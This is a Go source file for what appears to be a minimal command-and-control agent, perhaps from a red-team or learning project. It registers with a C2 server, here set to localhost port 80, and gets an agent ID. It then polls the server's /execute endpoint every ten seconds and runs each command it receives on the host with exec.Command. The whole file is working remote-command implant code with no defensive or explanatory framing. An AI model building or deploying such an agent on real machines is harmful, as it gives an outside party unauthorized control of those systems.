package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"
)

var c2server = "localhost"
var c2serverport = "80"

func main() {
	agentId := ""
	// sleep := time.Duration(10)
	sleep := 10
	// resp, err := http.Get("http://localhost:80/register")
	c2register := "http://" + c2server + ":" + c2serverport + "/register"
	register_resp, err := http.Get(c2register)

	if err != nil {
		log.Fatal(err)
	}

	defer register_resp.Body.Close()

	body, err := ioutil.ReadAll(register_resp.Body)
	agentId = string(body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Agent ID:", agentId)
loop:
	for {
		fmt.Printf("[*] Sleeping for %v seconds", sleep)
		time.Sleep(time.Duration(sleep) * time.Second)
		data := url.Values{
			"agentId": {agentId},
		}
		// resp2, err := http.PostForm("http://localhost:80/execute", data)
		c2execute := "http://" + c2server + ":" + c2serverport + "/execute"
		execute_response, err := http.PostForm(c2execute, data)

		if err != nil {
			log.SetFlags(0)
			log.Printf("[-] Error fetching command: %s", err)
		}

		defer execute_response.Body.Close()

		command, err := ioutil.ReadAll(execute_response.Body)

		if string(command) == "no commands found" {
			log.SetFlags(0)
			log.Println("\n[-] No command to run")
			goto loop
		}

		fmt.Println("[+] Running command: " + string(command))
		command_clean := strings.Replace(string(command), "\n", "", -1)
		command_array := strings.Fields(command_clean)
		out, err := exec.Command(command_array[0], command_array[1:]...).Output()
		if err != nil {
			log.SetFlags(0)
			log.Printf("[-] Error running command: %s", err)
		}
		fmt.Println(string(out))
	}
}
